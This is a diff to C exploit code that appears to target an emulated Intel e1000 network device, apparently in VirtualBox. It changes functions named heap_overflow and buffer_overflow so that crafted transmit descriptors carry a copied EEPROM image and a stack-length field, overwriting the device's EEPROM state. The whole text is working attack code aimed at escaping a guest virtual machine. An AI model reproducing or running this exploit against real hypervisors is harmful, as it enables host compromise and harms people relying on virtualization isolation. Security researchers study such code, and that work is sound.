@@ -39,6 +39,16 @@ uint8_t* bar0;
 struct e1000_desc* tx_ring;
 uint8_t* tx_buffer;
 static int	idx = 0;
+uint16_t mu16Data[64] =
+{	0x0008, 0x1527, 0x2049, 0x0000, 0xffff, 0x0000, 0x0000, 0x0000,
+	0x0000, 0x0000, 0x4408, 0x001e, 0x8086, 0x100e, 0x8086, 0x3040,
+	0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000,
+	0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000,
+	0x0000, 0x7061, 0x280c, 0x00c8, 0x00c8, 0x0000, 0x0000, 0x0000,
+	0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0602,
+	0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000,
+	0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x5fc4
+};
 
 /* ================================== CORE ================================ */
 /* ------------------------------ Constructor ----------------------------- */
@@ -135,7 +145,7 @@ static void e1k_configure(void)
 }
 
 /** heap_overflow : erase EEPROM writing address with new one
- * @param new_addr	new adress to write in EEPROM
+ * @param new_addr new adress to write in EEPROM
  */
 static void heap_overflow(uint16_t new_addr)
 {
@@ -151,7 +161,8 @@ static void heap_overflow(uint16_t new_addr)
 	//------------- Payload setup -------------//
 	
 	/* We will overflow on EEProm Struct. Looks like 
-	 *		...
+	 *      ...
+	 *		- uint16_t	m_au16Data[64]		(1024 bits)
 	 * 		- enum		m_eState			(32 bits)
 	 *		- bool		m_fWriteEnabled		(08 bits)
 	 * 		- uint8_t 	Alignment1			(08 bits)
@@ -160,13 +171,14 @@ static void heap_overflow(uint16_t new_addr)
      *		- uint16_t	m_u16Addr			(16 bits)
 	 * 		... 
      */
-    tx_buffer[PAYLOAD_LEN - 12]	= 0x01;
-    tx_buffer[PAYLOAD_LEN - 11]	= 0x00;
-    tx_buffer[PAYLOAD_LEN - 10]	= 0x00;
-    tx_buffer[PAYLOAD_LEN - 9]	= 0x00;
+	memcpy(&(tx_buffer[PAYLOAD_LEN - 141]), mu16Data, 128);
+	tx_buffer[PAYLOAD_LEN - 12]	= 0x01;
+	tx_buffer[PAYLOAD_LEN - 11]	= 0x00;
+	tx_buffer[PAYLOAD_LEN - 10]	= 0x00;
+	tx_buffer[PAYLOAD_LEN - 9]	= 0x00;
 	tx_buffer[PAYLOAD_LEN - 8]	= 0x01;
-    tx_buffer[PAYLOAD_LEN - 4]	= low16((1 << 15));
-    tx_buffer[PAYLOAD_LEN - 3]	= high16((1 << 15));
+	tx_buffer[PAYLOAD_LEN - 4]	= low16((1 << 15));
+	tx_buffer[PAYLOAD_LEN - 3]	= high16((1 << 15));
 	tx_buffer[PAYLOAD_LEN - 2]	= low16(new_addr);
 	tx_buffer[PAYLOAD_LEN - 1]	= high16(new_addr);
 	//-----------------------------------------//
@@ -376,7 +388,7 @@ static void buffer_overflow(void)
 	context_4->tcp_seg_setup.data		=	(uint32_t) ((0xF << 16));
 
 	data_5->buffer_addr					=	(uint64_t) physical_address;
-	data_5->lower.data					=	(uint32_t) (EOP | REPORT_STATUS | DESC_DATA | PAYLOAD_LEN | TSE);
+	data_5->lower.data					=	(uint32_t) (EOP | REPORT_STATUS | DESC_DATA | STACK_LEN | TSE);
 	data_5->upper.data					= 	(uint32_t) 0;
 	//-----------------------------------------//
 
